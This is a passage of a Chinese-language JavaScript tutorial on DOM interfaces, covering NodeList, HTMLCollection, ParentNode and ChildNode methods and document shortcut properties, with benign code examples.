<p>所有类似数组的对象，都可以使用方括号运算符取出成员。<strong>一般情况下，都是使用方括号运算符，而不使用<code>item</code>方法。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">childNodes</span>[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>



<h4 id="1-5-NodeList-prototype-keys-，NodeList-prototype-values-，NodeList-prototype-entries-遍历器对象，结合for…of遍历每一个成员的信息"><a href="#1-5-NodeList-prototype-keys-，NodeList-prototype-values-，NodeList-prototype-entries-遍历器对象，结合for…of遍历每一个成员的信息" class="headerlink" title="1.5 NodeList.prototype.keys()，NodeList.prototype.values()，NodeList.prototype.entries()  遍历器对象，结合for…of遍历每一个成员的信息"></a>1.5 NodeList.prototype.keys()，NodeList.prototype.values()，NodeList.prototype.entries()  遍历器对象，结合for…of遍历每一个成员的信息</h4><p>这三个方法都返回一个 ES6 的遍历器对象，可以通过<code>for...of</code>循环遍历获取每一个成员的信息。区别在于，<code>keys()</code>返回<strong>键名</strong>的遍历器，<code>values()</code>返回<strong>键值</strong>的遍历器，<code>entries()</code>返回的遍历器<strong>同时包含键名和键值的数组</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> children = <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">childNodes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">of</span> children.<span class="title function_">keys</span>()) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(key); <span class="comment">// 返回键名</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 0</span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> value <span class="keyword">of</span> children.<span class="title function_">values</span>()) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value); <span class="comment">// 返回键值 (即节点名)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// #text</span></span><br><span class="line"><span class="comment">// &lt;script&gt;</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> entry <span class="keyword">of</span> children.<span class="title function_">entries</span>()) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(entry); <span class="comment">// 返回键名和键值的数组</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Array [ 0, #text ]</span></span><br><span class="line"><span class="comment">// Array [ 1, &lt;script&gt; ]</span></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>



<h3 id="2、HTMLCollection-接口-（HTML元素节点的集合）"><a href="#2、HTMLCollection-接口-（HTML元素节点的集合）" class="headerlink" title="2、HTMLCollection 接口 （HTML元素节点的集合）"></a>2、HTMLCollection 接口 （HTML元素节点的集合）</h3><h4 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h4><p><code>HTMLCollection</code>是一个<strong>节点对象的集合，只能包含元素节点</strong>（element），不能包含其他类型的节点。它的返回值是一个<strong>类似数组的对象</strong>，但是与<code>NodeList</code>接口不同，<code>HTMLCollection</code><strong>没有<code>forEach</code>方法，只能使用<code>for</code>循环遍历。</strong></p>
<p>返回<code>HTMLCollection</code>实例的，主要是一些<code>Document</code>对象的集合属性，比如<code>document.links</code>、<code>document.forms</code>、<code>document.images</code>等。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">links</span> <span class="keyword">instanceof</span> <span class="title class_">HTMLCollection</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p><code>HTMLCollection</code>实例都是<strong>动态集合</strong>，节点的变化会实时反映在集合中。</p>
<p>如果元素节点有<code>id</code>或<code>name</code>属性，那么<code>HTMLCollection</code>实例上面，可以使用<code>id</code>属性或<code>name</code>属性引用该节点元素。如果没有对应的节点，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;img id=&quot;pic&quot; src=&quot;http://example.com/foo.jpg&quot;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pic = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;pic&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">images</span>.<span class="property">pic</span> === pic <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>document.images</code>是一个<code>HTMLCollection</code>实例，可以通过<code> &lt;img&gt; </code>元素的<code>id</code>属性值，从<code>HTMLCollection</code>实例上取到这个元素。</p>
<h6 id="各js选择器返回的数据对比"><a href="#各js选择器返回的数据对比" class="headerlink" title="各js选择器返回的数据对比"></a>各js选择器返回的数据对比</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;li1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;li2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">name</span>=<span class="string">&#x27;liName&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> li1 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;li1&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> li2 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#li1&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> li3 = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;li2&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> li4 = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;li&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> li5 = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;liName&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> li6 = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;li&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(li1) <span class="comment">// &lt;li id=&quot;li1&quot;&gt;&lt;/li&gt;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(li2) <span class="comment">// &lt;li id=&quot;li1&quot;&gt;&lt;/li&gt;</span></span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(li3) <span class="comment">// HTMLCollection [li.li2]</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(li4) <span class="comment">// HTMLCollection(3) [li#li1, li.li2, li, li1: li#li1, liName: li]</span></span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(li5) <span class="comment">// NodeList [li]</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(li6) <span class="comment">// NodeList(3) [li#li1, li.li2, li]</span></span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>





<h4 id="2-2-HTMLCollection-prototype-length"><a href="#2-2-HTMLCollection-prototype-length" class="headerlink" title="2.2 HTMLCollection.prototype.length"></a>2.2 HTMLCollection.prototype.length</h4><p><code>length</code>属性返回<code>HTMLCollection</code>实例包含的成员数量。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">links</span>.<span class="property">length</span> <span class="comment">// 18</span></span><br></pre></td></tr></table></figure>



<h4 id="2-3-HTMLCollection-prototype-item-和方括号访问一样"><a href="#2-3-HTMLCollection-prototype-item-和方括号访问一样" class="headerlink" title="2.3 HTMLCollection.prototype.item() 和方括号访问一样"></a>2.3 HTMLCollection.prototype.item() 和方括号访问一样</h4><p><code>item</code>方法接受一个整数值作为参数，表示成员的位置，返回该位置上的成员。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = <span class="variable language_">document</span>.<span class="property">images</span>;</span><br><span class="line"><span class="keyword">var</span> img0 = c.<span class="title function_">item</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>item(0)</code>表示返回0号位置的成员。由于方<strong>括号运算符也具有同样作用，而且使用更方便，所以一般情况下，总是使用方括号运算符</strong>。</p>
<p>如果参数值超出成员数量或者不合法（比如小于0），那么<code>item</code>方法返回<code>null</code>。</p>
<h4 id="2-4-HTMLCollection-prototype-namedItem-参数为id或name，返回元素节点"><a href="#2-4-HTMLCollection-prototype-namedItem-参数为id或name，返回元素节点" class="headerlink" title="2.4 HTMLCollection.prototype.namedItem() 参数为id或name，返回元素节点"></a>2.4 HTMLCollection.prototype.namedItem() 参数为id或name，返回元素节点</h4><p><code>namedItem</code>方法的<strong>参数是一个字符串，表示<code>id</code>属性或<code>name</code>属性的值，返回对应的元素节点</strong>。如果没有对应的节点，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;img id=&quot;pic&quot; src=&quot;http://example.com/foo.jpg&quot;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pic = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;pic&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">images</span>.<span class="title function_">namedItem</span>(<span class="string">&#x27;pic&#x27;</span>) === pic <span class="comment">// true</span></span><br></pre></td></tr></table></figure>



<h2 id="四、ParentNode-接口（父节点接口），ChildNode-接口（子节点接口）"><a href="#四、ParentNode-接口（父节点接口），ChildNode-接口（子节点接口）" class="headerlink" title="四、ParentNode 接口（父节点接口），ChildNode 接口（子节点接口）"></a>四、ParentNode 接口（父节点接口），ChildNode 接口（子节点接口）</h2><p> 节点对象除了继承 Node 接口以外，还会继承其他接口。<code>ParentNode</code>接口<strong>表示当前节点是一个父节点，提供一些处理子节点的方法</strong>。<code>ChildNode</code>接口<strong>表示当前节点是一个子节点，提供一些相关方法。</strong> </p>
<h3 id="1、ParentNode-接口"><a href="#1、ParentNode-接口" class="headerlink" title="1、ParentNode 接口"></a>1、ParentNode 接口</h3><p><strong>如果当前节点是父节点，就会继承<code>ParentNode</code>接口</strong>。由于只有<strong>元素节点</strong>（element）、<strong>文档节点</strong>（document）和<strong>文档片段节点</strong>（documentFragment）拥有子节点，因此只有这三类节点会继承<code>ParentNode</code>接口。</p>
<h4 id="1-1-属性"><a href="#1-1-属性" class="headerlink" title="1.1 属性"></a>1.1 属性</h4><h4 id="（1）ParentNode-children-（返回HTMLCollection实例，当前节点的所有元素子节点）"><a href="#（1）ParentNode-children-（返回HTMLCollection实例，当前节点的所有元素子节点）" class="headerlink" title="（1）ParentNode.children  （返回HTMLCollection实例，当前节点的所有元素子节点）"></a>（1）ParentNode.children  （返回HTMLCollection实例，当前节点的所有元素子节点）</h4><p><code>children</code>属性<strong>返回一个<code>HTMLCollection</code>实例，成员是当前节点的所有元素子节点</strong>。该属性<strong>只读</strong>。</p>
<p>下面是遍历某个节点的所有元素子节点的示例。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; el.<span class="property">children</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意，<code>children</code>属性<strong>只包括元素子节点</strong>，不包括其他类型的子节点（比如文本子节点）。如果没有元素类型的子节点，返回值<code>HTMLCollection</code>实例的<code>length</code>属性为<code>0</code>。</p>
<p>另外，<code>HTMLCollection</code>是动态集合，会实时反映 DOM 的任何变化。</p>
<h4 id="（2）ParentNode-firstElementChild-第一个元素子节点"><a href="#（2）ParentNode-firstElementChild-第一个元素子节点" class="headerlink" title="（2）ParentNode.firstElementChild 第一个元素子节点"></a>（2）ParentNode.firstElementChild 第一个元素子节点</h4><p><code>firstElementChild</code>属性<strong>返回当前节点的第一个元素子节点</strong>。如果没有任何元素子节点，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">firstElementChild</span>.<span class="property">nodeName</span></span><br><span class="line"><span class="comment">// &quot;HTML&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>document</code>节点的第一个元素子节点是&#96;&#96;。</p>
<h4 id="（3）ParentNode-lastElementChild-最后一个元素子节点"><a href="#（3）ParentNode-lastElementChild-最后一个元素子节点" class="headerlink" title="（3）ParentNode.lastElementChild 最后一个元素子节点"></a>（3）ParentNode.lastElementChild 最后一个元素子节点</h4><p><code>lastElementChild</code>属性<strong>返回当前节点的最后一个元素子节点</strong>，如果不存在任何元素子节点，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">lastElementChild</span>.<span class="property">nodeName</span></span><br><span class="line"><span class="comment">// &quot;HTML&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>document</code>节点的最后一个元素子节点是&#96;&#96;（因为<code>document</code>只包含这一个元素子节点）。</p>
<h4 id="（4）ParentNode-childElementCount-所有元素子节点的数量"><a href="#（4）ParentNode-childElementCount-所有元素子节点的数量" class="headerlink" title="（4）ParentNode.childElementCount 所有元素子节点的数量"></a>（4）ParentNode.childElementCount 所有元素子节点的数量</h4><p><code>childElementCount</code>属性<strong>返回一个整数，表示当前节点的所有元素子节点的数目</strong>。如果不包含任何元素子节点，则返回<code>0</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">childElementCount</span> <span class="comment">// 13</span></span><br></pre></td></tr></table></figure>



<h4 id="1-2-方法"><a href="#1-2-方法" class="headerlink" title="1.2 方法"></a>1.2 方法</h4><h5 id="ParentNode-append-插入子节点于后，ParentNode-prepend-插入子节点于前"><a href="#ParentNode-append-插入子节点于后，ParentNode-prepend-插入子节点于前" class="headerlink" title="ParentNode.append() 插入子节点于后，ParentNode.prepend()  插入子节点于前"></a>ParentNode.append() 插入子节点于后，ParentNode.prepend()  插入子节点于前</h5><p><code>append</code>方法<strong>为当前节点追加一个或多个子节点，位置是最后一个元素子节点的后面</strong>。</p>
<p>该方法不仅可以添加元素子节点，还可以添加文本子节点。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> parent = <span class="variable language_">document</span>.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加元素子节点</span></span><br><span class="line"><span class="keyword">var</span> p = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">parent.<span class="title function_">append</span>(p);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加文本子节点</span></span><br><span class="line">parent.<span class="title function_">append</span>(<span class="string">&#x27;Hello&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加多个元素子节点</span></span><br><span class="line"><span class="keyword">var</span> p1 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">parent.<span class="title function_">append</span>(p1, p2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加元素子节点和文本子节点</span></span><br><span class="line"><span class="keyword">var</span> p = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">parent.<span class="title function_">append</span>(<span class="string">&#x27;Hello&#x27;</span>, p);</span><br></pre></td></tr></table></figure>

<p>注意，该方法<strong>没有返回值</strong>。</p>
<p><code>prepend</code>方法为<strong>当前节点追加一个或多个子节点，位置是第一个元素子节点的前面</strong>。它的用法与<code>append</code>方法完全一致，也是<strong>没有返回值</strong>。</p>
<h3 id="2、ChildNode-接口"><a href="#2、ChildNode-接口" class="headerlink" title="2、ChildNode 接口"></a>2、ChildNode 接口</h3><p><strong>如果一个节点有父节点，那么该节点就继承了<code>ChildNode</code>接口。</strong></p>
<h4 id="2-1-ChildNode-remove-移除当前节点"><a href="#2-1-ChildNode-remove-移除当前节点" class="headerlink" title="2.1 ChildNode.remove() 移除当前节点"></a>2.1 ChildNode.remove() 移除当前节点</h4><p><code>remove</code>方法用于从父节点<strong>移除当前节点</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">el.<span class="title function_">remove</span>()</span><br></pre></td></tr></table></figure>

<p>上面代码在 DOM 里面移除了<code>el</code>节点。</p>
<h4 id="2-2-ChildNode-before-插入同级节点于前，ChildNode-after-插入同级节点于后"><a href="#2-2-ChildNode-before-插入同级节点于前，ChildNode-after-插入同级节点于后" class="headerlink" title="2.2 ChildNode.before() 插入同级节点于前，ChildNode.after() 插入同级节点于后"></a>2.2 ChildNode.before() 插入同级节点于前，ChildNode.after() 插入同级节点于后</h4><p><code>before</code>方法用于<strong>在当前节点的前面，插入一个或多个同级节点</strong>。两者拥有相同的父节点。</p>
<p>注意，该方法不仅可以插入元素节点，还可以插入文本节点。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> p1 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入元素节点</span></span><br><span class="line">el.<span class="title function_">before</span>(p);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入文本节点</span></span><br><span class="line">el.<span class="title function_">before</span>(<span class="string">&#x27;Hello&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入多个元素节点</span></span><br><span class="line">el.<span class="title function_">before</span>(p, p1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入元素节点和文本节点</span></span><br><span class="line">el.<span class="title function_">before</span>(p, <span class="string">&#x27;Hello&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><code>after</code>方法用于<strong>在当前节点的后面，插入一个或多个同级节点</strong>，两者拥有相同的父节点。用法与<code>before</code>方法完全相同。</p>
<h4 id="2-3-ChildNode-replaceWith-用参数节点替换当前节点"><a href="#2-3-ChildNode-replaceWith-用参数节点替换当前节点" class="headerlink" title="2.3 ChildNode.replaceWith() 用参数节点替换当前节点"></a>2.3 ChildNode.replaceWith() 用参数节点替换当前节点</h4><p><code>replaceWith</code>方法<strong>使用参数节点，替换当前节点。</strong>参数可以是元素节点，也可以是文本节点。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> span = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;span&#x27;</span>);</span><br><span class="line">el.<span class="title function_">replaceWith</span>(span);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>el</code>节点将被<code>span</code>节点替换。</p>
<h2 id="五、Document节点"><a href="#五、Document节点" class="headerlink" title="五、Document节点"></a>五、Document节点</h2><h3 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a>1、概述</h3><p><code>document</code>节点对象<strong>代表整个文档</strong>，每张网页都有自己的<code>document</code>对象。<code>window.document</code>属性就指向这个对象。只要浏览器开始载入 HTML 文档，该对象就存在了，可以直接使用。</p>
<p><code>document</code>对象有不同的办法可以获取。</p>
<ul>
<li>正常的网页，直接使用<code>document</code>或<code>window.document</code>。</li>
<li><code>iframe</code>框架里面的网页，使用<code>iframe</code>节点的<code>contentDocument</code>属性。</li>
<li>Ajax 操作返回的文档，使用<code>XMLHttpRequest</code>对象的<code>responseXML</code>属性。</li>
<li>内部节点的<code>ownerDocument</code>属性。</li>
</ul>
<p><code>document</code>对象<strong>继承了<code>EventTarget</code>接口、<code>Node</code>接口、<code>ParentNode</code>接口</strong>。这意味着，这些接口的方法都可以在<code>document</code>对象上调用。除此之外，<code>document</code>对象还有很多自己的属性和方法。</p>
<h3 id="2、属性"><a href="#2、属性" class="headerlink" title="2、属性"></a>2、属性</h3><h4 id="2-1-快捷方式属性-（指向文档内部某个节点的快捷方式）"><a href="#2-1-快捷方式属性-（指向文档内部某个节点的快捷方式）" class="headerlink" title="2.1 快捷方式属性 （指向文档内部某个节点的快捷方式）"></a>2.1 快捷方式属性 （指向文档内部某个节点的快捷方式）</h4><p><strong>以下属性是指向文档内部的某个节点的快捷方式。</strong></p>
<h5 id="（1）document-defaultView-返回window对象"><a href="#（1）document-defaultView-返回window对象" class="headerlink" title="（1）document.defaultView  返回window对象"></a>（1）document.defaultView  返回window对象</h5><p><code>document.defaultView</code>属性<strong>返回<code>document</code>对象所属的<code>window</code>对象</strong>。如果当前文档不属于<code>window</code>对象，该属性返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">defaultView</span> === <span class="variable language_">window</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>



<h5 id="（2）document-doctype-指向"><a href="#（2）document-doctype-指向" class="headerlink" title="（2）document.doctype 指向&lt;!DOCTYPE html&gt;"></a>（2）document.doctype 指向<code>&lt;!DOCTYPE html&gt;</code></h5><p>对于 HTML 文档来说，<code>document</code>对象<strong>一般有两个子节点</strong>。第一个子节点是<code>document.doctype</code>，指向<code>&lt;DOCTYPE&gt;</code>节点，即文档类型（Document Type Declaration，简写DTD）节点。HTML 的文档类型节点，一般写成<code>&lt;!DOCTYPE html&gt;</code>。如果网页没有声明 DTD，该属性返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> doctype = <span class="variable language_">document</span>.<span class="property">doctype</span>;</span><br><span class="line">doctype <span class="comment">// &quot;&lt;!DOCTYPE html&gt;&quot;</span></span><br><span class="line">doctype.<span class="property">name</span> <span class="comment">// &quot;html&quot;</span></span><br></pre></td></tr></table></figure>

<p><code>document.firstChild</code>通常就返回这个节点。</p>
<h5 id="（3）document-documentElement-返回当前文档的根元素节点，即节点"><a href="#（3）document-documentElement-返回当前文档的根元素节点，即节点" class="headerlink" title="（3）document.documentElement 返回当前文档的根元素节点，即&lt;html&gt;节点"></a>（3）document.documentElement 返回当前文档的根元素节点，即&lt;html&gt;节点</h5><p><code>document.documentElement</code>属性<strong>返回当前文档的根元素节点</strong>（root）。它通常是<code>document</code>节点的第二个子节点，紧跟在<code>document.doctype</code>节点后面。HTML网页的该属性，一般是<code>&lt;html&gt;</code>节点。</p>
<h5 id="（4）document-body-指向，document-head-指向"><a href="#（4）document-body-指向，document-head-指向" class="headerlink" title="（4）document.body 指向&lt;body&gt;，document.head 指向 &lt;head&gt;"></a>（4）document.body 指向&lt;body&gt;，document.head 指向 &lt;head&gt;</h5><p><code>document.body</code>属性指向<code>&lt;body&gt;</code>节点，<code>document.head</code>属性指向<code>&lt;head&gt;</code>节点。</p>
<p>这两个属性<strong>总是存在的</strong>，如果网页源码里面省略了<code>&lt;head&gt;</code>或<code>&lt;body&gt;</code>，浏览器会自动创建。另外，这两个属性是<strong>可写的</strong>，如果改写它们的值，相当于移除所有子节点。</p>
<h5 id="（5）document-scrollingElement-返回文档的滚动元素（标准模式-兼容模式）"><a href="#（5）document-scrollingElement-返回文档的滚动元素（标准模式-兼容模式）" class="headerlink" title="（5）document.scrollingElement 返回文档的滚动元素（标准模式&lt;html&gt;,兼容模式&lt;body&gt;）"></a>（5）document.scrollingElement 返回文档的滚动元素（标准模式&lt;html&gt;,兼容模式&lt;body&gt;）</h5><p><code>document.scrollingElement</code>属性<strong>返回文档的滚动元素</strong>。也就是说，当文档整体滚动时，到底是哪个元素在滚动。</p>
<p><strong>标准模式下</strong>，这个属性<strong>返回的文档的根元素<code>document.documentElement</code>（即<code>&lt;html&gt;</code>）</strong>。</p>
<p><strong>兼容（quirk）模式下</strong>，<strong>返回的是<code>&lt;body&gt;</code>元素</strong>，如果该元素不存在，返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 页面滚动到浏览器顶部</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">scrollingElement</span>.<span class="property">scrollTop</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>



